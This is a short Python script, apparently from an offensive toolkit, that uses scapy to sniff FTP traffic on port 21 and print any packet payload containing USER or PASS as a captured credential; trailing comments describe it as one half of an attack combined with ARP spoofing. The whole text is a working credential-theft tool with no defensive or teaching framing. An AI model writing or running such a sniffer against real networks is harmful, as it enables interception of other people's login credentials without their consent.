

from scapy.all import sniff, Raw

def pkt_callback(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if "USER" in payload or "PASS" in payload:
            print(f"[+] Captured FTP Credential: {payload.strip()}")

print("[*] Sniffing FTP credentials on port 21...")
sniff(filter="tcp port 21", prn=pkt_callback, store=0)





## Sniffs the network traffic and extracts FTP credentials
## analyse.sh – Automates the attack: ARP spoof + sniff FTP